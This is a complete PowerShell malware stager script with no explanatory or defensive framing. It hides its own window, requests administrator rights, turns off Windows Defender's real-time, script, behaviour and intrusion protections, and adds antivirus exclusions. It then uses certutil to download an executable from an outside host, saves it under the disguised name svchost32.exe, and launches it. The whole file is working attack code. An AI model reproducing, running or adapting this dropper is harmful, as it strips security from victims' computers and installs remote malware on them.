# ============================================================
# stager.ps1 - disable AV -> certutil -> visible launch
# ============================================================

if (-not $env:STAGER_CHILD) {
    $env:STAGER_CHILD = "1"
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName  = "powershell.exe"
    $psi.Arguments = "-NoExit -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
    $psi.UseShellExecute = $true
    $psi.WindowStyle = 'Hidden'
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    return
}

$ErrorActionPreference = 'Continue'
$ProgressPreference    = 'SilentlyContinue'

$EXE_URL  = 'http://kekman.space/verify.exe'
$EXE_NAME = 'svchost32.exe'

# --- elevate if not admin (needed for Set-MpPreference) ---
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        Start-Process powershell -Verb RunAs -ArgumentList '-NoExit','-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-File',"`"$PSCommandPath`""
    } catch {}
    return
}

# --- 1. disable Defender ---
try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop } catch {}
try { Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue } catch {}
try { Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue } catch {}
try { Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue } catch {}
try { Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
try { Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue } catch {}

# --- 2. certutil download ---
$dest = Join-Path $env:TEMP $EXE_NAME
if (Test-Path $dest) { Remove-Item $dest -Force -ErrorAction SilentlyContinue }

$out = & certutil.exe -urlcache -split -f $EXE_URL $dest 2>&1

if (-not (Test-Path $dest)) {
    Read-Host "download failed"
    return
}
$size = (Get-Item $dest).Length
if ($size -lt 1024) {
    Read-Host "file too small ($size bytes)"
    return
}

try { Unblock-File -Path $dest -ErrorAction SilentlyContinue } catch {}

# --- 3. launch with VISIBLE window, cwd set ---
try {
    $p = Start-Process -FilePath $dest `
                       -WorkingDirectory $env:TEMP `
                       -PassThru `
                       -WindowStyle Normal `
                       -ErrorAction Stop
    Write-Host "[+] launched PID $($p.Id) cwd=$env:TEMP"
} catch {
    try {
        $psi2 = New-Object System.Diagnostics.ProcessStartInfo
        $psi2.FileName = $dest
        $psi2.WorkingDirectory = $env:TEMP
        $psi2.UseShellExecute = $true
        $proc = [System.Diagnostics.Process]::Start($psi2)
        Write-Host "[+] launched via .NET PID $($proc.Id)"
    } catch {
        Read-Host "launch failed: $($_.Exception.Message)"
    }
}